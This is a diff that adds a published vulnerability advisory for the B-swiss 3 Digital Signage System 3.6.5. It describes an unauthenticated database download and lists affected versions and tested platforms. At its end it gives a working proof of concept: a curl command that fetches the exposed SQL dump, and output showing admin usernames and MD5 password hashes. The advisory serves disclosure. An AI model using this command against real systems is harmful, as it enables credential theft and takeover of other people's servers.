@@ -1,0 +1,100 @@
+# Exploit Title: B-swiss 3 Digital Signage System 3.6.5 -  Database Disclosure
+# Date: 2020-09-16
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.b-swiss.com
+# Version: 3.6.5
+# Affected version: 3.6.5,3.6.2,3.6.1,3.6.0,3.5.80,3.5.40,3.5.20,3.5.00,3.2.00,3.1.00
+
+B-swiss 3 Digital Signage System 3.6.5 Database Disclosure
+
+
+Vendor: B-Swiss SARL | b-tween Sarl
+Product web page: https://www.b-swiss.com
+Affected version: 3.6.5
+                  3.6.2
+                  3.6.1
+                  3.6.0
+                  3.5.80
+                  3.5.40
+                  3.5.20
+                  3.5.00
+                  3.2.00
+                  3.1.00
+
+Summary: Intelligent digital signage made easy. To go beyond the
+possibilities offered, b-swiss allows you to create the communication
+solution for your specific needs and your graphic charter. You benefit
+from our experience and know-how in the realization of your digital
+signage project.
+
+Desc: The application is vulnerable to unauthenticated database download
+and information disclosure vulnerability. This can enable the attacker to
+disclose sensitive information resulting in authentication bypass, session
+hijacking and full system control.
+
+Tested on: Linux 5.3.0-46-generic x86_64
+           Linux 4.15.0-20-generic x86_64
+           Linux 4.9.78-xxxx-std-ipv6-64
+           Linux 4.7.0-040700-generic x86_64
+           Linux 4.2.0-27-generic x86_64
+           Linux 3.19.0-47-generic x86_64
+           Linux 2.6.32-5-amd64 x86_64
+           Darwin 17.6.0 root:xnu-4570.61.1~1 x86_64
+           macOS 10.13.5
+           Microsoft Windows 7 Business Edition SP1 i586
+           Apache/2.4.29 (Ubuntu)
+           Apache/2.4.18 (Ubuntu)
+           Apache/2.4.7 (Ubuntu)
+           Apache/2.2.22 (Win64)
+           Apache/2.4.18 (Ubuntu)
+           Apache/2.2.16 (Debian)
+           PHP/7.2.24-0ubuntu0.18.04.6
+           PHP/5.6.40-26+ubuntu18.04.1+deb.sury.org+1
+           PHP/5.6.33-1+ubuntu16.04.1+deb.sury.org+1
+           PHP/5.6.31
+           PHP/5.6.30-10+deb.sury.org~xenial+2
+           PHP/5.5.9-1ubuntu4.17
+           PHP/5.5.9-1ubuntu4.14
+           PHP/5.3.10
+           PHP/5.3.13
+           PHP/5.3.3-7+squeeze16
+           PHP/5.3.3-7+squeeze17
+           MySQL/5.5.49
+           MySQL/5.5.47
+           MySQL/5.5.40
+           MySQL/5.5.30
+           MySQL/5.1.66
+           MySQL/5.1.49
+           MySQL/5.0.77
+           MySQL/5.0.12-dev
+           MySQL/5.0.11-dev
+           MySQL/5.0.8-dev
+           phpMyAdmin/3.5.7
+           phpMyAdmin/3.4.10.1deb1
+           phpMyAdmin/3.4.7
+           phpMyAdmin/3.3.7deb7
+           WampServer 3.2.0
+           Acore Framework 2.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5588
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5588.php
+
+
+13.06.2020
+
+--
+
+
+$ curl -s http://192.168.10.11/bswiss3.sql |grep admin_m -B1 -A4
+
+INSERT INTO `users` (`id`, `created_by`, `created_by_adminlevelid`, `firstname`, `lastname`, `email`, `username`, `password`, `adminlevel`, `status`, `language`, `creationdate`, `receives_validation_alerts`, `can_change_password`) VALUES
+(1, 0, 0, 'Dusko', 'Dolgousko', 'duki@looney.tunes', 'admin_m', '999f311dd5bd2b83ea849229a8906b29', 100000, 1, 'french-sw', '0000-00-00 00:00:00', 1, 0),
+(3, 2, 7, 'b-swiss', ' ', ' ', 'b-swiss', '999f311dd5bd2b83ea849229a8906b29', 7, 1, 'french-sw', '2020-06-27 16:28:30', 0, 1),
+(13, 3, 7, 'Admin', ' ', ' ', 'admin', '21232f297a57a5a743894a0e4a801fc3', 24, 1, 'french-sw', '2020-07-26 17:48:16', 0, 1),
+(14, 13, 24, 'User', ' ', ' ', 'User', 'ee11cbb19052e40b07aac0ca060c23ee', 26, 1, 'french-sw', '2020-07-27 14:26:35', 0, 1),
+(18, 13, 24, 'Test', ' ', ' ', 'test', '81dc9bdb52d04dc20036dbd8313ed055', 29, 1, 'french-sw', '2020-07-27 14:30:07', 0, 1);
